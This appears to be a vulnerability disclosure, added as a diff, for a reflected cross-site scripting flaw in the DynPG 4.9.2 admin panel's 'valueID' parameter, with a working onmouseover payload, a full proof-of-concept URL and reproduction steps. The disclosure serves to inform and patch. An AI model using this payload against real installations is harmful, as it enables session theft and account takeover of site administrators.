@@ -1,0 +1,21 @@
+Description
+
+A cross-site scripting (XSS) issue in the DynPG admin login panel version 4.9.2 allows remote attackers to inject JavaScript via the "valueID" Parameter
+___
+XSS Payload: x"%20onmouseover=alert(4)%20x="
+___
+Vulnerable URI: valueID
+___
+Steps to Reproduce the Issue:
+
+1- Login to DynPG admin panel
+2- Paste below POC:
+https://localhost/dynpg/backendpopup/popup.php?limit=&orderby=&page=&popUpResource=images&query=&refID=group_image&returnCall=&singlePopup=false&sort=&valueID=x"%20onmouseover=alert(6)%20x="
+
+(hover your mouse to “select no entry” to trigger XSS)
+
+
+Video POC: 
+___
+Impact
+With the help of xss attacker can perform social engineering on users by redirecting them from real website to fake one. Attacker can steal their cookies leading to account takeover and download a malware on their system, and there are many more attacking scenarios a skilled attacker can perform with xss.
